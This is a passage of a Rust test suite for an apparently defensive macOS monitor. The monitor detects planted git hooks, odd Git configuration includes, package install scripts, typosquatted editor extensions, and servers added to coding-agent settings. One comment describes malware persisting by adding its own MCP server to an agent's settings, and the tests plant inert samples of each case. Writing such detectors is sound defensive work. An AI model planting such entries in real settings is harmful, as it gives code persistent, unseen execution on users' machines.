            "file:machine:mac/dev/tree/.git/user-hooks/pre-auto-gc",
            "file:machine:mac/dev/tree/.git/user-hooks/pre-receive",
            "file:machine:mac/dev/tree/user-hooks/pre-push"
        ]
    );
    std::fs::remove_file(global).unwrap();
    e.full();
    assert_eq!(paths(), ["file:machine:mac/dev/tree/xdg-hooks/pre-push"]);
    std::fs::remove_file(e.home().join(".config/git/config")).unwrap();
    e.full();
    assert_eq!(paths(), ["file:machine:mac/dev/tree/system-hooks/pre-push"]);
}

/// The live entries of the git hook readings, in order.
fn live_hooks(e: &Estate) -> Vec<String> {
    e.rows("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = 'git hook' AND layer = 'live' ORDER BY subject")
}

/// The latest reading of the hooks of the checkout `dev/tree`, as completeness and reason.
fn tree_hooks_reading(e: &Estate) -> String {
    e.rows("SELECT completeness, reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1").concat()
}

#[test]
fn a_hook_planted_in_dot_git_hooks_is_found_whatever_git_configuration_says() {
    // `.git/hooks` is read as it always was; the folder the configuration names is only read
    // besides. A folder padded with entries is read whole, and an untold folder is no finding.
    let e = Estate::new("git-hooks-always");
    let tree = e.checkout("dev/tree");
    let config = tree.join(".git/config");
    for n in 0..300 {
        put(&tree.join(format!(".git/hooks/pad-{n}")), "# padding\n");
    }
    put(&tree.join(".git/more.conf"), "[core]\n hooksPath = tools\n");
    put(
        &tree.join(".git/config.worktree"),
        "[core]\n sparseCheckout = true\n",
    );
    // Git looks in `/` for an empty value, never in the working tree.
    put(&tree.join("pre-commit"), "# not a hook\n");
    e.full();
    let big = format!("[core]\n hooksPath = tools\n{}", "#".repeat(1024 * 1024));
    let cases = [
        (
            "[core]\n hooksPath = \":(optional)tools\"\n",
            "partial|",
            "unsupported path magic",
        ),
        (
            "[core]\n hooksPath = %(prefix)/tools\n",
            "partial|",
            "unsupported Git path expansion",
        ),
        (
            "[core]\n hooksPath = ~nobody/tools\n",
            "partial|",
            "unsupported Git path expansion",
        ),
        (
            "[includeIf \"gitdir:/elsewhere/\"]\n path = more.conf\n",
            "partial|",
            "includeIf",
        ),
        (
            "[core]\n repositoryformatversion = 1\n[extensions]\n worktreeConfig = true\n",
            "full|",
            "",
        ),
        ("[core]\n hooksPath =\n", "full|", ""),
        ("[core]\n hooksPath = .git/HEAD\n", "full|", ""),
        (&big, "partial|", "size cap"),
        (
            // A NUL in a value would read as a record of its own in Git's `--null` listing.
            "[core]\n hooksPath = tools\n[x]\n y = \"a\0core.hookspath\\n/\"\n",
            "partial|",
            "could not parse",
        ),
    ];
    let mut planted = Vec::new();
    for (n, (local, completeness, why)) in cases.into_iter().enumerate() {
        put(&config, local);
        put(&tree.join(format!(".git/hooks/planted-{n}")), "#!/bin/sh\n");
        planted.push(pair(
            "watched.git-hook",
            &format!("~/dev/tree/.git/hooks/planted-{n}"),
        ));
        e.full();
        let reading = tree_hooks_reading(&e);
        assert!(
            reading.starts_with(completeness) && reading.contains(why),
            "{reading}"
        );
        assert_eq!(e.found(), planted);
    }
    put(&config, "[core]\n hooksPath = tools\n");
    put(&tree.join(".git/commondir"), "..\n");
    put(&tree.join(".git/hooks/planted-last"), "#!/bin/sh\n");
    planted.push(pair(
        "watched.git-hook",
        "~/dev/tree/.git/hooks/planted-last",
    ));
    e.full();
    assert!(tree_hooks_reading(&e).contains("separate common directory"));
    assert_eq!(e.found(), planted);
    // What leaves `.git/hooks` is gone while the folder stays untold.
    std::fs::remove_file(tree.join(".git/hooks/pad-0")).unwrap();
    e.full();
    assert!(!live_hooks(&e).contains(&"file:machine:mac/dev/tree/.git/hooks/pad-0".to_string()));
}

#[test]
fn git_hooks_follow_a_plain_include_and_config_worktree_to_the_folder_they_name() {
    let e = Estate::new("git-hooks-include");
    let tree = e.checkout("dev/tree");
    // An include path is taken from the including file's folder, or `~/`.
    put(
        &e.home().join(".gitconfig"),
        "[include]\n path = git/extra.conf\n",
    );
    put(
        &e.home().join("git/extra.conf"),
        "[include]\n path = ~/git/hooks.conf\n",
    );
    put(
        &e.home().join("git/hooks.conf"),
        "[core]\n hooksPath = ~/shared-hooks\n",
    );
    put(&e.home().join("shared-hooks/pre-push"), "# shared\n");
    put(&tree.join("wt-hooks/pre-commit"), "# worktree config\n");
    e.full();
    assert_eq!(tree_hooks_reading(&e), "full|");
    assert_eq!(live_hooks(&e), ["file:machine:mac/shared-hooks/pre-push"]);
    // As `git sparse-checkout` leaves it: `config.worktree` is read after `config`.
    put(
        &tree.join(".git/config"),
        "[core]\n repositoryformatversion = 1\n[extensions]\n worktreeConfig\n",
    );
    put(
        &tree.join(".git/config.worktree"),
        "[core]\n hooksPath = wt-hooks\n",
    );
    e.full();
    assert_eq!(
        live_hooks(&e),
        ["file:machine:mac/dev/tree/wt-hooks/pre-commit"]
    );
}

#[test]
fn git_hooks_say_why_an_include_leaves_the_folder_untold_and_an_include_if_naming_none_does_not() {
    let e = Estate::new("git-hooks-include-untold");
    let tree = e.checkout("dev/tree");
    let global = e.home().join(".gitconfig");
    // An includeIf after the setting, whose file names no folder, leaves the setting.
    put(
        &tree.join(".git/config"),
        "[core]\n hooksPath = tools\n[includeIf \"gitdir:~/work/\"]\n path = ~/work.conf\n",
    );
    put(&tree.join("tools/pre-commit"), "# tools\n");
    put(
        &e.home().join("work.conf"),
        "[user]\n name = Someone\n[include]\n path = absent.conf\n",
    );
    put(
        &e.home().join("Documents/git.conf"),
        "[core]\n hooksPath = elsewhere\n",
    );
    e.full();
    assert_eq!(tree_hooks_reading(&e), "full|");
    // Git follows ten nested includes and refuses an eleventh that is there, whatever a later
    // file says; a missing one is skipped.
    for n in 1..=10 {
        let next = format!("[include]\n path = inc-{}.conf\n", n + 1);
        put(&e.home().join(format!("inc-{n}.conf")), &next);
    }
    for first in ["inc-1.conf", "inc-2.conf"] {
        put(&global, &format!("[include]\n path = {first}\n"));
        e.full();
        assert_eq!(tree_hooks_reading(&e), "full|");
        put(&e.home().join("inc-11.conf"), "[user]\n name = Someone\n");
    }
    let untold = "partial|the folder Git's configuration names for hooks could not be told: ";
    let last_cause = "SELECT cause FROM coverage WHERE scope = 'checkout:machine:mac/dev/tree' AND reader = 'watched-places' ORDER BY id DESC LIMIT 1";
    for (included, why, cause) in [
        (
            "[include]\n path = inc-1.conf\n",
            "Git configuration includes go more than 10 levels deep",
            "failed",
        ),
        (
            "[include]\n path = Documents/git.conf\n[core]\n hooksPath = tools\n",
            "Git's configuration leads into ~/Documents, which macOS asks permission for",
            "not_given",
        ),
    ] {
        put(&global, included);
        e.full();
        assert_eq!(tree_hooks_reading(&e), format!("{untold}{why}"));
        assert_eq!(e.rows(last_cause), [cause]);
        assert_eq!(
            live_hooks(&e),
            ["file:machine:mac/dev/tree/tools/pre-commit"]
        );
    }
    assert!(e.found().is_empty());
    let met = "SELECT reason FROM coverage WHERE reader = 'watched-places' AND kind = 'folders macOS asks permission for' ORDER BY id DESC LIMIT 1";
    assert!(e.rows(met)[0].contains("~/Documents"));
    // An includeIf whose file cannot be read could name a folder: untold, as that file is.
    put(&global, "");
    put(
        &e.home().join("work.conf"),
        "[include]\n path = Documents/git.conf\n",
    );
    e.full();
    let documents_why =
        "Git's configuration leads into ~/Documents, which macOS asks permission for";
    assert_eq!(tree_hooks_reading(&e), format!("{untold}{documents_why}"));
    // What `.git/hooks` could not be read for is said before it, the reading is no calmer than
    // that alone, and the cause is one only when both have it.
    let documents = e.home().join("Documents/hooks");
    link(documents.to_str().unwrap(), &tree.join(".git/hooks"));
    let tail = "; the folder Git's configuration names for hooks could not be told: Git's configuration leads into ~/Documents, which macOS asks permission for";
    for (head, cause) in [
        (
            "none|not looked into: dev/tree/.git/hooks: it leads into ~/Documents",
            "not_given",
        ),
        ("none|could not be read: dev/tree/.git/hooks (", "failed"),
    ] {
        e.full();
        let reading = tree_hooks_reading(&e);
        assert!(
            reading.starts_with(head) && reading.ends_with(tail),
            "{reading}"
        );
        assert_eq!(e.rows(last_cause), [cause]);
        std::fs::remove_file(tree.join(".git/hooks")).unwrap();
        put(&tree.join(".git/hooks"), "not a folder\n");
    }
}

#[test]
fn git_hooks_folder_is_untold_only_when_a_moved_working_tree_moves_a_relative_path() {
    let e = Estate::new("git-hooks-moved");
    let tree = e.checkout("dev/tree");
    let shared = e.home().join("shared");
    put(&shared.join("pre-push"), "# absolute\n");
    for (local, completeness) in [
        ("[core]\n bare = false\n hooksPath = tools\n", "full|"),
        ("[core]\n bare = true\n hooksPath = tools\n", "partial|"),
        (
            "[core]\n worktree = ../elsewhere\n hooksPath = tools\n",
            "partial|",
        ),
        (
            &format!(
                "[core]\n worktree = ../elsewhere\n hooksPath = {}\n",
                shared.display()
            ),
            "full|",
        ),
    ] {
        put(&tree.join(".git/config"), local);
        e.full();
        let reading = tree_hooks_reading(&e);
        assert!(reading.starts_with(completeness), "{local}: {reading}");
        assert_eq!(
            completeness == "partial|",
            reading.contains("core.worktree or core.bare")
        );
    }
    assert_eq!(live_hooks(&e), ["file:machine:mac/shared/pre-push"]);
    // `config.worktree` moves the working tree as `config` does.
    put(
        &tree.join(".git/config"),
        "[core]\n repositoryformatversion = 1\n[extensions]\n worktreeConfig\n",
    );
    put(
        &tree.join(".git/config.worktree"),
        "[core]\n bare = true\n hooksPath = tools\n",
    );
    e.full();
    assert!(tree_hooks_reading(&e).contains("core.worktree or core.bare"));
}

#[test]
fn git_hooks_configured_as_dot_git_hooks_leave_nothing_beside_them_gone() {
    let e = Estate::new("git-hooks-own-folder");
    let tree = e.checkout("dev/tree");
    put(
        &tree.join(".git/hooks/pre-commit"),
        "#!/bin/sh\n. .git/hooks/lib.sh\n",
    );
    put(&tree.join(".git/hooks/lib.sh"), "# helper\n");
    e.full();
    for path in [".git/hooks", "hooks"] {
        put(
            &tree.join(".git/config"),
            &format!("[core]\n hooksPath = {path}\n"),
        );
        e.full();
        assert!(e.found().is_empty());
        assert_eq!(tree_hooks_reading(&e), "full|");
        assert_eq!(
            live_hooks(&e),
            [
                "file:machine:mac/dev/tree/.git/hooks/lib.sh",
                "file:machine:mac/dev/tree/.git/hooks/pre-commit"
            ]
        );
    }
}

#[test]
fn git_hooks_are_told_from_the_files_the_login_job_reads_whatever_the_run_s_environment_says() {
    // The login job has only `HOME`: a run from a shell that sets `XDG_CONFIG_HOME` reads the
    // same files, so neither run says the other's hooks are gone or new.
    let e = Estate::new("git-hooks-xdg");
    let tree = e.checkout("dev/tree");
    put(
        &e.home().join(".config/git/config"),
        "[core]\n hooksPath = tools\n",
    );
    put(&e.0.join("xdg/git/config"), "[core]\n hooksPath = other\n");
    put(&tree.join("tools/pre-commit"), "# tools\n");
    put(&tree.join("other/pre-commit"), "# other\n");
    for xdg in [None, Some(e.0.join("xdg")), None] {
        let mut run = e.command(None, &e.0.join("empty"));
        if let Some(xdg) = xdg {
            run.env("XDG_CONFIG_HOME", xdg);
        }
        assert!(run.output().unwrap().status.success());
        assert_eq!(
            live_hooks(&e),
            ["file:machine:mac/dev/tree/tools/pre-commit"]
        );
        assert!(e.found().is_empty());
    }
}

#[test]
fn git_hooks_read_config_worktree_only_where_git_reads_it() {
    // Git takes `extensions.worktreeConfig` only beside a format version, and reads its words;
    // a value Git reads by its own number rules leaves the folder untold.
    let e = Estate::new("git-hooks-worktree-config");
    let tree = e.checkout("dev/tree");
    put(&tree.join("evil/pre-commit"), "# evil\n");
    put(&tree.join("decoy/pre-commit"), "# decoy\n");
    put(
        &tree.join(".git/config.worktree"),
        "[core]\n hooksPath = decoy\n",
    );
    let odd = "partial|the folder Git's configuration names for hooks could not be told: core.bare, extensions.worktreeConfig or core.repositoryformatversion has a value this reader does not read";
    for (layout, read) in [
        ("[extensions]\n worktreeConfig = true\n", "evil"),
        (
            "[core]\n repositoryformatversion = 0\n[extensions]\n worktreeConfig = true\n",
            "decoy",
        ),
        (
            "[core]\n repositoryformatversion = 1\n[extensions]\n worktreeConfig = off\n",
            "evil",
        ),
        (
            "[core]\n repositoryformatversion = 1\n[extensions]\n worktreeConfig = 00\n",
            "",
        ),
        (
            "[core]\n repositoryformatversion = 2\n[extensions]\n worktreeConfig = true\n",
            "",
        ),
        ("[core]\n bare = 0x0\n", ""),
    ] {
        put(
            &tree.join(".git/config"),
            &format!("[core]\n hooksPath = evil\n{layout}"),
        );
        e.full();
        let reading = tree_hooks_reading(&e);
        if read.is_empty() {
            assert_eq!(reading, odd, "{layout}");
        } else {
            assert_eq!(reading, "full|", "{layout}");
            let hook = format!("file:machine:mac/dev/tree/{read}/pre-commit");
            assert_eq!(live_hooks(&e), [hook], "{layout}");
        }
    }
}

#[test]
fn git_hooks_read_apple_git_s_own_file_before_the_system_file() {
    // Apple Git reads `usr/share/git-core/gitconfig` of its developer folder first. The run
    // reads it under the system root it is given, as it reads `/etc/gitconfig`.
    let e = Estate::new("git-hooks-apple");
    let tree = e.checkout("dev/tree");
    let selected = Command::new("/usr/bin/xcode-select")
        .env_clear()
        .arg("--print-path")
        .output()
        .unwrap();
    let developer = String::from_utf8(selected.stdout).unwrap();
    let apple =
        e.0.join("system")
            .join(developer.trim_end().trim_start_matches('/'))
            .join("usr/share/git-core/gitconfig");
    put(&apple, "[core]\n hooksPath = apple-hooks\n");
    put(&tree.join("apple-hooks/pre-commit"), "# apple\n");
    put(&tree.join("etc-hooks/pre-commit"), "# etc\n");
    e.full();
    assert_eq!(
        live_hooks(&e),
        ["file:machine:mac/dev/tree/apple-hooks/pre-commit"]
    );
    put(
        &e.0.join("system/etc/gitconfig"),
        "[core]\n hooksPath = etc-hooks\n",
    );
    e.full();
    assert_eq!(
        live_hooks(&e),
        ["file:machine:mac/dev/tree/etc-hooks/pre-commit"]
    );
}

#[test]
fn git_hooks_includes_that_fan_out_stop_at_a_budget_and_leave_the_folder_untold() {
    // Each file includes the next four times: within Git's depth, over a thousand files.
    let e = Estate::new("git-hooks-fan-out");
    let tree = e.checkout("dev/tree");
    put(&tree.join(".git/hooks/pre-commit"), "# own\n");
    for n in 0..5 {
        let next = format!("[include]\n path = fan-{}.conf\n", n + 1).repeat(4);
        put(&e.home().join(format!("fan-{n}.conf")), &next);
    }
    put(
        &e.home().join(".gitconfig"),
        "[include]\n path = fan-0.conf\n",
    );
    let started = std::time::Instant::now();
    e.full();
    assert!(started.elapsed() < std::time::Duration::from_secs(20));
    assert_eq!(
        tree_hooks_reading(&e),
        "partial|the folder Git's configuration names for hooks could not be told: more than 64 Git configuration files are included"
    );
    assert_eq!(
        live_hooks(&e),
        ["file:machine:mac/dev/tree/.git/hooks/pre-commit"]
    );
}

#[test]
fn git_hooks_say_that_git_s_own_folder_or_a_configuration_file_could_not_be_read() {
    use std::os::unix::fs::PermissionsExt;
    let e = Estate::new("git-hooks-unreadable");
    let tree = e.checkout("dev/tree");
    let config = tree.join(".git/config");
    put(&config, "[core]\n hooksPath = tools\n");
    let mode = |path: &Path, mode| {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap()
    };
    mode(&config, 0o000);
    e.full();
    let reading = tree_hooks_reading(&e);
    assert!(
        reading.ends_with(
            "a Git configuration file could not be read: Permission denied (os error 13)"
        ),
        "{reading}"
    );
    mode(&config, 0o644);
    mode(&tree.join(".git"), 0o000);
    e.full();
    let reading = tree_hooks_reading(&e);
    mode(&tree.join(".git"), 0o755);
    assert!(
        reading.starts_with("none|could not be read: dev/tree/.git/hooks (")
            && reading.ends_with("could not be told: could not read .git"),
        "{reading}"
    );
}

/// An agent's session that worked in these folders.
fn session(e: &Estate, name: &str, cwd: &Path) {
    put(
        &e.0.join(format!("sessions/{name}/session.jsonl")),
        &format!("{}\n", serde_json::json!({ "cwd": cwd })),
    );
}

#[test]
fn a_project_reached_only_through_agents_sessions_is_silent_at_the_first_check_and_told_once_later()
{
    // Agents work in folders the walk of the home folder never lists. A project their sessions
    // lead to at the first check is the silent baseline. Sessions name folders and do not list
    // them, so one an agent starts in later cannot be shown to be new: it is told once, and no
    // rule raises it.
    let e = Estate::new("agents-later");
    let old = e.0.join("elsewhere/old");
    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&old, "\"preinstall\": \"node x.js\"");
    session(&e, "old", &old);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    let new = e.0.join("elsewhere/new");
    put(&new.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&new, "\"preinstall\": \"node x.js\"");
    session(&e, "new", &new);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    let told = e.told();
    assert_eq!(told.len(), 1, "{told:?}");
    assert!(told[0].ends_with("/elsewhere/new (1)"), "{told:?}");
}

#[test]
fn a_project_in_a_folder_the_walk_skips_is_told_once_when_agents_sessions_are_first_read() {
    // The sessions could not be read at the first check. The walk went through the home
    // folder but not into its hidden folders, so a project there that the sessions lead to
    // later was never looked at: what it holds is told once and kept as its baseline.
    let e = Estate::new("agents-hidden");
    let hidden = e.home().join(".tools/helper");
    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&hidden, "\"preinstall\": \"node x.js\"");
    put(&e.0.join("sessions"), "not a folder\n");
    e.run_with(&e.home(), &e.0.join("sessions"));
    std::fs::remove_file(e.0.join("sessions")).unwrap();
    session(&e, "helper", &hidden);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/.tools/helper (1)"]);
    assert!(
        !e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live'
               AND subject LIKE '%.tools/helper/package.json#/scripts/preinstall'"
        )
        .is_empty()
    );
}

#[test]
fn a_place_a_newer_version_reads_for_the_first_time_is_told_once_and_a_change_after_is_found() {
    // A new row in a kind of place the store has read for long: what it holds at its first
    // reading is told once and raised by no rule, and a change in it after that is found.
    let e = Estate::new("new-place");
    put(&e.home().join(".zshrc"), "export A=1\n");
    put(&e.home().join(".bash_login"), "export B=1\n");
    e.run();
    // As a version that did not read ~/.bash_login left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE subject LIKE '%/.bash_login' OR scope LIKE '%/.bash_login';
         DELETE FROM coverage WHERE scope LIKE '%/.bash_login';
         DELETE FROM unit_read WHERE unit = '.bash_login';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["file:machine:mac/.bash_login (1)"]);
    e.seen();
    put(&e.home().join(".bash_login"), "export B=2\n");
    e.run();
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.bash_login")]);
}

#[test]
fn every_way_read_is_on_the_page_and_the_status_counts_as_many_read_and_those_present_and_not() {
    // The page lists the ways that are read. A way the program does not read is never silent:
    // the status's one item counts as many read as the page lists, and those present here.
    let e = Estate::new("ways");
    for rel in ["dev/a", "dev/b"] {
        let c = e.checkout(rel);
        put(&c.join(".envrc"), "use flake\n");
        package(&c, "");
    }
    put(&e.checkout("dev/c").join("bunfig.toml"), "preload = []\n");
    e.full();
    let page = e.this_mac_page();
    let start = page.find("<section id=\"ways-code-runs\">").unwrap();
    let section = &page[start..start + page[start..].find("</section>").unwrap()];
    let rows: Vec<Vec<&str>> = section
        .split("<tr>")
        .skip(2)
        .map(|row| {
            row.split("<td")
                .skip(1)
                .map(|cell| &cell[cell.find('>').unwrap() + 1..cell.find("</td>").unwrap()])
                .collect()
        })
        .collect();
    let read = rows.len();
    assert!(rows.iter().all(|r| r[3].starts_with("Read")), "{rows:?}");
    let here: Vec<(&str, &str)> = rows
        .iter()
        .filter(|r| r[4] != "0" && r[4] != "—")
        .map(|r| (r[0], r[4]))
        .collect();
    assert_eq!(here, [("package.json", "2")]);
    // Present and not read: `.envrc` and `bunfig.toml`, which no row of the page names.
    assert!(!section.contains(".envrc") && !section.contains("bunfig.toml"));
    let present = 2;

    let item = |r: &serde_json::Value| {
        r["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .find(|u| u["id"] == "project-autorun")
            .unwrap()
            .clone()
    };
    let u = item(&e.status());
    let title = u["title"].as_str().unwrap();
    assert!(
        title.starts_with(&format!("This version reads {read} of the "))
            && title.ends_with(" known ways a project can make code run by itself."),
        "{title}"
    );
    assert_eq!(
        u["meaning"],
        format!(
            "{present} of the others are present in your projects and are not read, so a change in them would go unseen."
        )
    );
    // Ways found here raised it: it holds on this Mac, never on every Mac.
    assert!(present > 0);
    assert_eq!(
        (&u["who"], &u["count"], &u["holds_on"]),
        (&"nothing".into(), &present.into(), &"this_mac".into())
    );
    // The status's item of what it does not understand no longer names them.
    assert!(
        e.status()["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .all(|u| u["id"] != "not-understood")
    );
    for c in ["dev/a", "dev/c"] {
        std::fs::remove_dir_all(e.home().join(c)).unwrap();
    }
    std::fs::remove_file(e.home().join("dev/b/.envrc")).unwrap();
    // "None" is said of the projects only after a walk of the whole home folder.
    e.full();
    assert_eq!(
        item(&e.status())["meaning"],
        "None of the others is present in your projects now."
    );
    // A walk of a given folder, or one that left out a folder macOS protects, says what it
    // looked at, that the rest was not, and why.
    let partial = |why: &str| format!("{NONE_PART} Why: {why}.");
    e.run_in(&e.home().join("dev"));
    assert_eq!(
        item(&e.status())["meaning"],
        partial("only the given folder was walked")
    );
    std::fs::create_dir_all(e.home().join("Documents")).unwrap();
    e.full();
    assert_eq!(
        item(&e.status())["meaning"],
        partial("projects inside folders macOS protects were not looked into")
    );
}

/// The kinds the summary's table of what is watched says none of: each row whose state is
/// "none here".
fn none_said(view: &str) -> Vec<String> {
    view.split("<div class=\"wr\"")
        .skip(1)
        .filter_map(|row| {
            let row = &row[..row.find("</div>")?];
            let kind = row.split("<span>").nth(1)?.split("</span>").next()?;
            row.contains("</span>none here").then(|| kind.to_string())
        })
        .collect()
}

/// The section of the page of this Mac about a kind, by its anchor.
fn section<'a>(page: &'a str, id: &str) -> &'a str {
    let start = page
        .find(&format!("<section id=\"{id}\">"))
        .unwrap_or_else(|| panic!("{id}\n{page}"));
    let rest = &page[start..];
    &rest[..rest.find("</section>").unwrap()]
}

#[test]
fn no_page_says_none_of_what_is_in_projects_after_a_walk_that_did_not_find_them_all() {
    // One project in ~/dev, read; one in ~/Documents with a git hook, a folder macOS protects
    // that the walk does not look into. What projects hold is not known while one may be
    // unseen, so no page says none of it; after a whole walk the same pages do.
    let e = Estate::new("walk-pages");
    put(&e.checkout("dev/shop").join("package-lock.json"), LOCK);
    let in_projects = [
        ("Git hooks in projects", "git-hooks-in-projects"),
        (
            "Files in projects that git runs code from",
            "files-in-projects-that-git-runs-code-from",
        ),
        (
            "Editor tasks that run when a project is opened",
            "editor-tasks-that-run-when-a-project-is-opened",
        ),
        (
            "Programs and commands a project sets an editor to run",
            "programs-and-commands-a-project-sets-an-editor-to-run",
        ),
        (
            "Programs and tools a project tells your coding agent to run",
            "programs-and-tools-a-project-tells-your-coding-agent-to-run",
        ),
        (
            "Tools your coding agent may use in a project without asking",
            "tools-your-coding-agent-may-use-in-a-project-without-asking",
        ),
        (
            "Scripts that run when a project&#39;s packages are installed",
            "scripts-that-run-when-a-project-s-packages-are-installed",
        ),
    ];
    // A whole walk: none of them in the one project, and the pages say so.
    e.full();
    let said = none_said(&e.page("view.html"));
    let page = e.this_mac_page();
    for (kind, id) in in_projects {
        assert!(said.iter().any(|k| k == kind), "{kind}: {said:?}");
        assert!(section(&page, id).contains("None found here."), "{id}");
    }
    let whole = said;
    // A project in a folder the walk does not look into.
    let app = e.checkout("Documents/app");
    put(
        &app.join(".git/hooks/pre-commit"),
        "#!/bin/sh\necho invented\n",
    );
    e.full();
    let said = none_said(&e.page("view.html"));
    let page = e.this_mac_page();
    for (kind, id) in in_projects {
        assert!(!said.iter().any(|k| k == kind), "{kind}: {said:?}");
        let part = section(&page, id);
        assert!(
            !part.contains("None found here.") && part.contains("None in the projects found."),
            "{id}: {part}"
        );
    }
    // The count of what projects depend on is of the projects found, and says so.
    assert!(
        section(&page, "packages-your-projects-depend-on")
            .contains("<p>The projects found on this Mac depend on "),
        "{page}"
    );
    // What is not in projects is said as before.
    assert!(
        whole
            .iter()
            .filter(|k| !in_projects.iter().any(|(p, _)| p == k))
            .all(|k| said.contains(k)),
        "{whole:?} {said:?}"
    );
}

// The home folder: a developer tool's own settings.

/// Claude Code's state file as it rewrites it, with servers of one project and these more of
/// the user's.
fn state(e: &Estate, starts: u32, project: &str) {
    put(
        &e.home().join(".claude.json"),
        &format!(
            "{{\"numStartups\": {starts}, \"tipsHistory\": {{\"a\": {starts}}}, \"mcpServers\": {{}},
              \"projects\": {{\"/invented/shop\": {{\"allowedTools\": [], \"history\": [{starts}],
                \"mcpServers\": {{{project}}}}}}}}}"
        ),
    );
}

const DESKTOP: &str = "Library/Application Support/Claude/claude_desktop_config.json";

#[test]
fn a_planted_tool_in_an_agents_own_settings_is_a_finding_and_an_edit_elsewhere_in_that_file_is_not()
{
    // How malware made agents run its code in every project: its own server added to the
    // agent's settings in the home folder. Claude Code rewrites its state file all the time;
    // only the servers in it are read, so its rewrites are nothing to find.
    let e = Estate::new("home-agents");
    state(&e, 1, "");
    put(&e.home().join(DESKTOP), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert_eq!(
        e.coverage("~/.claude.json, the part that runs by itself"),
        "full|none of the keys read is in ~/.claude.json"
    );

    state(&e, 2, "");
    put(
        &e.home().join(DESKTOP),
        "{\"mcpServers\": {}, \"globalShortcut\": \"Cmd+Space\"}",
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    state(
        &e,
        3,
        "\"helper\": {\"command\": \"node\", \"args\": [\".invented/x.js\"]}",
    );
    put(
        &e.home().join(DESKTOP),
        "{\"mcpServers\": {\"helper\": {\"command\": \"node\"}}}",
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-settings",
                "~/.claude.json#/projects/~1invented~1shop/mcpServers/helper"
            ),
            pair(
                "autorun.agent-settings",
                &format!("~/{DESKTOP}#/mcpServers/helper")
            ),
        ]
    );
}

/// An extension's folder as VS Code names it, holding its manifest.
fn extension(e: &Estate, folder: &str) {
    put(
        &e.home()
            .join(".vscode/extensions")
            .join(folder)
            .join("package.json"),
        "{}",
    );
}

#[test]
fn an_extensions_new_version_is_not_a_finding_and_a_new_extension_or_a_new_publisher_is() {
    // The editor updates its extensions by itself: a new version is a new folder, and the old
    // one goes. Only what identifies an extension apart from its version is watched.
    let e = Estate::new("extensions");
    let folder = e.home().join(".vscode/extensions");
    extension(&e, "ms-python.python-2024.2.1-darwin-arm64");
    extension(&e, "esbenp.prettier-vscode-10.1.0");
    put(&folder.join("extensions.json"), "[]");
    put(&folder.join(".obsolete"), "{}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    std::fs::remove_dir_all(folder.join("ms-python.python-2024.2.1-darwin-arm64")).unwrap();
    extension(&e, "ms-python.python-2024.4.0-darwin-arm64");
    extension(&e, "esbenp.prettier-vscode-11.0.0");
    std::fs::create_dir_all(folder.join(".4a1b2c3d-extracting")).unwrap();
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    extension(&e, "esbemp.prettier-vscode-11.0.0");
    extension(&e, "invented.helper-0.0.1");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.editor-extension",
                "~/.vscode/extensions/esbemp.prettier-vscode"
            ),
            pair(
                "autorun.editor-extension",
                "~/.vscode/extensions/invented.helper"
            ),
        ]
    );
}

#[test]
fn a_place_in_the_home_folder_read_for_the_first_time_on_an_existing_store_is_told_once() {
    // A store of an earlier build never read the home folder's settings: what they hold the
    // first time is told once, not a finding about every server and extension.
    let e = Estate::new("home-upgrade");
    state(&e, 1, "\"helper\": {\"command\": \"node\"}");
    put(
        &e.home().join(".gemini/settings.json"),
        "{\n  // mine\n  \"mcpServers\": {\"x\": {\"command\": \"npx\"}}\n}",
    );
    extension(&e, "esbenp.prettier-vscode-10.1.0");
    e.run();
    // As an earlier build left it: no reading of these kinds, nothing they asserted.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage
           WHERE kind LIKE '~/%' OR kind LIKE 'other places in the home folder%'
              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%');
         DELETE FROM assertion WHERE kind LIKE '~/%' OR scope LIKE '%#/%'
              OR scope LIKE '%/.vscode/extensions/%';
         DELETE FROM coverage WHERE kind LIKE '~/%' OR kind LIKE 'other places in the home folder%'
              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%';
         DELETE FROM unit_read WHERE kind LIKE '~/%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(
        e.told(),
        [
            "file:machine:mac/.claude.json (1)",
            "file:machine:mac/.gemini/settings.json (1)",
            "file:machine:mac/.vscode/extensions (1)"
        ]
    );
    e.seen();
    extension(&e, "invented.helper-0.0.1");
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-extension",
            "~/.vscode/extensions/invented.helper"
        )]
    );
}

#[test]
fn the_home_item_counts_as_many_places_read_as_the_page_lists_and_those_present_and_not() {
    // The page lists the places that are read. A place the program does not read is never
    // silent: the status's one item counts as many read as the page lists, and those present.
    let e = Estate::new("home-places");
